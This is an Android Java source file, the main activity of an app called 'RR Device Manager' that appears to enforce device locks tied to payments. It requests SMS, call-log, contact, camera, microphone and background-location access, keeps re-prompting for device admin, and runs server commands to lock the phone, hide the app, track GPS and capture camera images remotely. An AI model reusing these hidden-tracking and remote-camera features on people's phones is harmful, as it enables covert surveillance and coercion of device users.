package com.riad.rrlkr.ui;

import android.Manifest;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.riad.rrlkr.R;
import com.riad.rrlkr.admin.EMIDeviceAdminReceiver;
import com.riad.rrlkr.network.ApiClient;
import com.riad.rrlkr.network.ApiService;
import com.riad.rrlkr.network.models.CommandAck;
import com.riad.rrlkr.network.models.CommandResponse;
import com.riad.rrlkr.service.DeviceMonitorService;
import com.riad.rrlkr.service.DeviceProtectionManager;
import com.riad.rrlkr.service.LockManager;
import com.riad.rrlkr.util.DeviceUtils;
import com.riad.rrlkr.util.PreferenceManager;
import com.google.firebase.messaging.FirebaseMessaging;

import java.util.List;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

/**
 * Main Activity - Entry point and status display
 */
public class MainActivity extends AppCompatActivity {
    
    private static final String TAG = "MainActivity";
    private static final int REQUEST_DEVICE_ADMIN = 1001;
    private static final int REQUEST_PERMISSIONS = 1002;
    
    private TextView tvStatus;
    private TextView tvDeviceInfo;
    private TextView tvEnrollmentStatus;
    private Button btnEnroll;
    private Button btnActivateAdmin;
    
    private PreferenceManager preferenceManager;
    private ApiService apiService;
    
    private static final int REQUEST_BACKGROUND_LOCATION = 1003;

    /**
     * Builds the full runtime-permission list for the current Android version.
     * Adds camera, microphone and the granular media (photos/videos/audio)
     * permissions so the user is actually prompted for them. On Android 12 and
     * below the legacy READ_EXTERNAL_STORAGE covers media instead.
     */
    private String[] buildRequiredPermissions() {
        java.util.ArrayList<String> perms = new java.util.ArrayList<>();
        // Base permissions (POST_NOTIFICATIONS only exists on Android 13+)
        perms.add(Manifest.permission.READ_PHONE_STATE);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.POST_NOTIFICATIONS);
        }
        perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        perms.add(Manifest.permission.READ_CALL_LOG);
        perms.add(Manifest.permission.READ_SMS);
        perms.add(Manifest.permission.READ_CONTACTS);
        // Camera + microphone (for remote camera capture & audio streaming)
        perms.add(Manifest.permission.CAMERA);
        perms.add(Manifest.permission.RECORD_AUDIO);
        // Media access
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+ granular media permissions (photos, videos, audio)
            perms.add(Manifest.permission.READ_MEDIA_IMAGES);
            perms.add(Manifest.permission.READ_MEDIA_VIDEO);
            perms.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            // Android 12 and below
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        return perms.toArray(new String[0]);
    }
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        preferenceManager = new PreferenceManager(this);
        apiService = ApiClient.getApiService();
        
        // Initialize views
        tvStatus = findViewById(R.id.tv_status);
        tvDeviceInfo = findViewById(R.id.tv_device_info);
        tvEnrollmentStatus = findViewById(R.id.tv_enrollment_status);
        btnEnroll = findViewById(R.id.btn_enroll);
        btnActivateAdmin = findViewById(R.id.btn_activate_admin);
        
        // Set click listeners
        btnEnroll.setOnClickListener(v -> startEnrollment());
        btnActivateAdmin.setOnClickListener(v -> requestDeviceAdmin());
        
        // Check permissions
        checkPermissions();
        
        // Get FCM token
        getFcmToken();
        
        // Auto-activate Device Admin if not already active
        // No USB/PC needed - just install the app and it auto-prompts
        autoActivateDeviceAdminIfNeeded();
        
        // Update UI
        updateUI();
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        updateUI();
        
        // Start background service if enrolled
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId != null && !deviceId.isEmpty()) {
            DeviceMonitorService.start(this);
        }
        
        // Always start Lock Task mode and apply protections if Device Owner
        // BUT skip if admin has disabled the app remotely
        if (!preferenceManager.isAppDisabled()) {
            DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
            if (protectionManager.isDeviceOwner()) {
                DeviceProtectionManager.startLockTaskMode(this);
            }
        }
        
        // Check if device is locked
        if (preferenceManager.isDeviceLocked()) {
            LockManager.showLockScreen(this);
        }
        
        // Check for pending commands from server
        checkPendingCommands();
    }
    
    private void checkPendingCommands() {
        String deviceId = preferenceManager.getDeviceId();
        if (deviceId == null || deviceId.isEmpty()) {
            Log.d(TAG, "No device ID - skipping pending commands check");
            return;
        }
        
        Log.d(TAG, "Checking pending commands for device: " + deviceId);
        
        apiService.getPendingCommands(deviceId).enqueue(new Callback<List<CommandResponse>>() {
            @Override
            public void onResponse(Call<List<CommandResponse>> call, Response<List<CommandResponse>> response) {
                if (response.isSuccessful() && response.body() != null) {
                    List<CommandResponse> commands = response.body();
                    Log.d(TAG, "Found " + commands.size() + " pending commands");
                    processCommands(commands);
                }
            }
            
            @Override
            public void onFailure(Call<List<CommandResponse>> call, Throwable t) {
                Log.e(TAG, "Failed to check pending commands", t);
            }
        });
    }
    
    private void processCommands(List<CommandResponse> commands) {
        for (CommandResponse cmd : commands) {
            String type = cmd.getCommandType();
            Log.d(TAG, "Processing command: " + type + " id: " + cmd.getId());
            
            if ("LOCK".equalsIgnoreCase(type) || "lock".equals(type)) {
                String message = "Device locked by administrator.";
                String contact = null;
                
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null) {
                    if (payload.containsKey("message")) {
                        message = String.valueOf(payload.get("message"));
                    }
                    if (payload.containsKey("contact_number")) {
                        contact = String.valueOf(payload.get("contact_number"));
                    }
                }
                
                Log.i(TAG, "Lock command received - locking device");
                preferenceManager.saveBoolean("admin_lock_command", true);
                preferenceManager.setDeviceLocked(true);
                LockManager.showLockScreen(MainActivity.this, message, contact);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UNLOCK".equalsIgnoreCase(type) || "unlock".equals(type)) {
                Log.i(TAG, "Unlock command received - unlocking device");
                preferenceManager.saveBoolean("admin_lock_command", false);
                preferenceManager.setDeviceLocked(false);
                LockManager.hideLockScreen(MainActivity.this);
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("DISABLE_APP".equalsIgnoreCase(type) || "disable_app".equals(type)) {
                Log.w(TAG, "Disable app command received - PERMANENTLY REMOVING APP");
                // Mark as disabled FIRST so app doesn't re-apply on restart
                preferenceManager.setAppDisabled(true);
                preferenceManager.setProtectionsApplied(false);
                preferenceManager.setDeviceLocked(false);
                
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(MainActivity.this);
                protectionManager.removeAllProtections();
                protectionManager.unhideAppInLauncher();
                protectionManager.enableStatusBar();
                
                // Stop lock task mode
                try {
                    stopLockTask();
                } catch (Exception e) {
                    Log.w(TAG, "Could not stop lock task: " + e.getMessage());
                }
                
                acknowledgeCommand(cmd.getId(), "executed");
                Toast.makeText(MainActivity.this, "App is being permanently uninstalled by admin", Toast.LENGTH_LONG).show();
                
                // Clear device owner and uninstall after short delay
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    protectionManager.clearDeviceOwnerAndUninstall();
                }, 2000);
                break; // Stop processing further commands
                
            } else if ("ENABLE_APP".equalsIgnoreCase(type) || "enable_app".equals(type)) {
                Log.i(TAG, "Enable app command received - re-applying protections");
                // Clear disabled flag so protections re-apply
                preferenceManager.setAppDisabled(false);
                
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(MainActivity.this);
                protectionManager.applyAllProtections();
                preferenceManager.setProtectionsApplied(true);
                DeviceProtectionManager.startLockTaskMode(MainActivity.this);
                acknowledgeCommand(cmd.getId(), "executed");
                Toast.makeText(MainActivity.this, "App protections enabled by admin", Toast.LENGTH_LONG).show();
                
            } else if ("UNINSTALL_APP".equalsIgnoreCase(type) || "uninstall_app".equals(type)) {
                Log.w(TAG, "Uninstall app command received - PERMANENTLY REMOVING APP");
                preferenceManager.setAppDisabled(true);
                preferenceManager.setProtectionsApplied(false);
                preferenceManager.setDeviceLocked(false);
                
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(MainActivity.this);
                protectionManager.removeAllProtections();
                protectionManager.unhideAppInLauncher();
                protectionManager.enableStatusBar();
                
                // Stop lock task mode
                try {
                    stopLockTask();
                } catch (Exception e) {
                    Log.w(TAG, "Could not stop lock task: " + e.getMessage());
                }
                
                acknowledgeCommand(cmd.getId(), "executed");
                Toast.makeText(MainActivity.this, "App is being permanently uninstalled by admin", Toast.LENGTH_LONG).show();
                
                // Clear device owner and uninstall after short delay
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    protectionManager.clearDeviceOwnerAndUninstall();
                }, 2000);
                break; // Stop processing further commands
                
            } else if ("HIDE_APP".equalsIgnoreCase(type) || "hide_app".equals(type)) {
                Log.i(TAG, "Hide app command received");
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(MainActivity.this);
                protectionManager.hideAppFromLauncher();
                acknowledgeCommand(cmd.getId(), "executed");
                
            } else if ("UNHIDE_APP".equalsIgnoreCase(type) || "unhide_app".equals(type)) {
                Log.i(TAG, "Unhide app command received");
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(MainActivity.this);
                protectionManager.unhideAppInLauncher();
                acknowledgeCommand(cmd.getId(), "executed");

            } else if ("GPS_TRACK".equalsIgnoreCase(type) || "gps_track".equals(type)) {
                Log.i(TAG, "GPS track command received - getting location");
                com.riad.rrlkr.service.LocationTracker locationTracker = new com.riad.rrlkr.service.LocationTracker(MainActivity.this);
                locationTracker.trackAndReport();
                acknowledgeCommand(cmd.getId(), "executed");

            } else if ("CAMERA_ON".equalsIgnoreCase(type) || "camera_on".equals(type)) {
                Log.i(TAG, "Camera ON command received - starting capture");
                preferenceManager.setCameraActive(true);
                long interval = 3000;
                Map<String, Object> payload = cmd.getPayload();
                if (payload != null && payload.containsKey("capture_interval")) {
                    try {
                        interval = Long.parseLong(String.valueOf(payload.get("capture_interval"))) * 1000;
                    } catch (Exception e) { Log.w(TAG, "Invalid capture interval"); }
                }
                com.riad.rrlkr.service.RemoteCameraCapture cameraCapture = new com.riad.rrlkr.service.RemoteCameraCapture(MainActivity.this);
                cameraCapture.captureAndReport(true, interval);
                acknowledgeCommand(cmd.getId(), "executed");

            } else if ("CAMERA_OFF".equalsIgnoreCase(type) || "camera_off".equals(type)) {
                Log.i(TAG, "Camera OFF command received - stopping capture");
                preferenceManager.setCameraActive(false);
                com.riad.rrlkr.service.RemoteCameraCapture cameraCapture = new com.riad.rrlkr.service.RemoteCameraCapture(MainActivity.this);
                cameraCapture.stopCapture();
                acknowledgeCommand(cmd.getId(), "executed");
            }
        }
    }
    
    private void acknowledgeCommand(String commandId, String status) {
        if (commandId == null) return;
        
        CommandAck ack = new CommandAck();
        ack.setCommandId(commandId);
        ack.setStatus(status);
        
        apiService.acknowledgeCommand(ack).enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.d(TAG, "Command acknowledged: " + commandId);
                } else {
                    Log.e(TAG, "Failed to acknowledge command: " + response.code());
                }
            }
            
            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e(TAG, "Error acknowledging command: " + t.getMessage());
            }
        });
    }
    
    private void checkPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] required = buildRequiredPermissions();
            boolean allGranted = true;
            for (String permission : required) {
                if (ContextCompat.checkSelfPermission(this, permission) 
                        != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (!allGranted) {
                ActivityCompat.requestPermissions(this, required, REQUEST_PERMISSIONS);
            } else {
                // All basic permissions granted, now request background location (Android 10+)
                requestBackgroundLocationIfNeeded();
            }
        }
    }

    private void requestBackgroundLocationIfNeeded() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                        REQUEST_BACKGROUND_LOCATION);
            }
        }
    }
    
    private void getFcmToken() {
        FirebaseMessaging.getInstance().getToken()
            .addOnCompleteListener(task -> {
                if (!task.isSuccessful()) {
                    Log.w(TAG, "Fetching FCM token failed", task.getException());
                    return;
                }
                
                String token = task.getResult();
                Log.d(TAG, "FCM Token: " + token);
                preferenceManager.setFcmToken(token);
            });
    }
    
    private void updateUI() {
        // Device Admin status
        boolean isAdmin = EMIDeviceAdminReceiver.isAdminActive(this);
        boolean isDeviceOwner = EMIDeviceAdminReceiver.isDeviceOwner(this);
        
        boolean isEnrolled = preferenceManager.isEnrolled();
        
        StringBuilder statusText = new StringBuilder();
        statusText.append("Admin: ").append(isAdmin ? "ON" : "OFF").append("\n");
        statusText.append("Owner: ").append(isDeviceOwner ? "Setup done" : "Not setup yet").append("\n");
        statusText.append("Status: ").append(preferenceManager.isDeviceLocked() ? "Locked" : "Active").append("\n");

        // Show protection status (Device Admin model)
        if (isEnrolled && isAdmin) {
            statusText.append("\nProtection active");
        } else if (isEnrolled && !isAdmin) {
            statusText.append("\nActivate Device Admin");
        }
        
        tvStatus.setText(statusText.toString());
        
        // Device info - minimal, no sensitive data exposed
        StringBuilder deviceInfo = new StringBuilder();
        deviceInfo.append("Model: ").append(Build.MODEL).append("\n");
        deviceInfo.append("Android: ").append(Build.VERSION.RELEASE);
        
        tvDeviceInfo.setText(deviceInfo.toString());
        
        // Enrollment status
        tvEnrollmentStatus.setText(isEnrolled ? "Device Enrolled" : "Not Enrolled");
        tvEnrollmentStatus.setTextColor(getColor(isEnrolled ? R.color.green : R.color.red));
        
        // Enroll button is ALWAYS visible. When not enrolled it reads "Enroll
        // Device"; once enrolled it becomes "Re-enroll" so the admin/customer can
        // force a fresh registration to the admin panel at any time.
        btnEnroll.setVisibility(View.VISIBLE);
        btnEnroll.setText(isEnrolled ? "Re-enroll Device" : "Enroll Device");
        // Show Activate Admin button only while admin isn't active yet.
        btnActivateAdmin.setVisibility(isAdmin ? View.GONE : View.VISIBLE);
        if (!isAdmin) btnActivateAdmin.setText("Activate Admin");
        
        // Start monitoring service if admin is active
        if (isAdmin && isEnrolled) {
            DeviceMonitorService.start(this);
        }
        
        // Apply device protections whenever Device Owner is active
        // BUT skip if admin has disabled the app remotely
        if (isDeviceOwner && !preferenceManager.isAppDisabled()) {
            // Run off the UI thread Ã¢â‚¬â€ applyAllProtections() makes dozens of
            // synchronous DPM calls which cause ANR / system PermissionController
            // crashes on some MTK / NEXG ROMs.
            final DeviceProtectionManager protectionManager = new DeviceProtectionManager(getApplicationContext());
            new Thread(() -> {
                try {
                    protectionManager.applyAllProtections();
                } catch (Throwable t) {
                    Log.e(TAG, "updateUI applyAllProtections failed", t);
                }
            }, "UpdateUiApplyProtections").start();
        }
    }
    
    /**
     * Auto-activate Device Admin when app is first opened.
     * No USB or PC needed - the app prompts the user directly.
     * NOTE: Device Owner requires QR provisioning or ADB - cannot be set from app.
     */
    private void autoActivateDeviceAdminIfNeeded() {
        boolean isAdmin = EMIDeviceAdminReceiver.isAdminActive(this);
        boolean isDeviceOwner = EMIDeviceAdminReceiver.isDeviceOwner(this);
        
        if (isDeviceOwner) {
            // Already Device Owner - apply protections
            Log.i(TAG, "Already Device Owner - applying protections");
            if (!preferenceManager.isAppDisabled()) {
                final DeviceProtectionManager pm = new DeviceProtectionManager(getApplicationContext());
                new Thread(() -> {
                    try { pm.applyAllProtections(); } catch (Throwable t) {
                        Log.e(TAG, "autoActivate applyAllProtections failed", t);
                    }
                }, "AutoActivateApplyProtections").start();
            }
            return;
        }
        
        if (!isAdmin) {
            // Not admin yet - auto-prompt for Device Admin activation
            Log.i(TAG, "Auto-requesting Device Admin activation");
            ComponentName adminComponent = EMIDeviceAdminReceiver.getComponentName(this);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
                "RR Device Manager requires device admin access to protect and manage your device.");
            startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
        } else {
            // Device Admin already active - start monitoring
            Log.i(TAG, "Device Admin already active");
            DeviceMonitorService.start(this);
        }
    }
    
    private void requestDeviceAdmin() {
        if (EMIDeviceAdminReceiver.isAdminActive(this)) {
            Toast.makeText(this, "Device Admin already active", Toast.LENGTH_SHORT).show();
            DeviceMonitorService.start(this);
            return;
        }
        
        ComponentName adminComponent = EMIDeviceAdminReceiver.getComponentName(this);
        
        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, 
            "RR Device Manager requires device admin access to protect and manage your device.");
        
        startActivityForResult(intent, REQUEST_DEVICE_ADMIN);
    }

    private void startEnrollment() {
        if (!EMIDeviceAdminReceiver.isAdminActive(this)) {
            new AlertDialog.Builder(this)
                .setTitle("Device Admin Required")
                .setMessage("Please activate Device Admin first before enrolling.")
                .setPositiveButton("Activate", (d, w) -> requestDeviceAdmin())
                .setNegativeButton("Cancel", null)
                .show();
            return;
        }

        // FCM is optional - try to get token but don't block enrollment
        String fcmToken = preferenceManager.getFcmToken();
        if (fcmToken == null || fcmToken.isEmpty()) {
            Log.i(TAG, "FCM token not available, proceeding without it");
            getFcmToken(); // Try to get it in background
        }

        Intent intent = new Intent(this, EnrollmentActivity.class);
        startActivity(intent);
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_DEVICE_ADMIN) {
            if (resultCode == RESULT_OK) {
                Toast.makeText(this, "Device Admin activated", Toast.LENGTH_SHORT).show();
                // Start monitoring service
                DeviceMonitorService.start(this);

            } else {
                Toast.makeText(this, "Device Admin activation cancelled", Toast.LENGTH_SHORT).show();
                // Re-prompt Ã¢â‚¬â€ admin is required
                new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                    autoActivateDeviceAdminIfNeeded();
                }, 2000);
            }
            updateUI();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == REQUEST_PERMISSIONS) {
            updateUI();
            // After basic permissions granted, request background location
            requestBackgroundLocationIfNeeded();
        } else if (requestCode == REQUEST_BACKGROUND_LOCATION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "Background location permission granted");
            } else {
                Log.w(TAG, "Background location permission denied");
            }
        }
    }
}
